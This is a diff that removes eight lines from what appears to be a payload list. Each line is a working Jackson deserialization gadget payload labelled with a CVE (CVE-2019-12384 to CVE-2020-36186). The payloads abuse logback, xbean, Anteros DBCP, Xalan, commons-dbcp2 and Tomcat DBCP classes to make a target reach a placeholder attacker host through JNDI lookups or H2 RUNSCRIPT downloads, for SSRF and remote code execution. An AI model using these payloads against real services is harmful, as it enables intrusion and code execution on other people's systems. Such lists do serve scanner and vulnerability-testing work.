@@ -1,8 +1,0 @@
-{"ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:tcp://$ip$/payload1"}} #CVE-2019-12384 SSRF
-{"ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://$ip$/payload2'"}} #CVE-2019-12384 RCE
-{"org.apache.xbean.propertyeditor.JndiConverter", {"asText":"$type$://$ip$/payload3"}} #CVE-2020-8840
-{"br.com.anteros.dbcp.AnterosDBCPConfig",{"metricRegistry":"$type$://$ip$/payload4"}} #CVE-2020-9548
-{"br.com.anteros.dbcp.AnterosDBCPDataSource",{"metricRegistry":"$type$://$ip$/payload5"}} #CVE-2020-24616
-{"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool",{"jndiPath":"$type$://$ip$/payload6"}} #CVE-2020-35728
-{"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS","url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://$ip$/payload7'"} #CVE-2020-36179
-["org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource",{"dataSourceName":"$type$://$ip$/payload8"}] #CVE-2020-36186
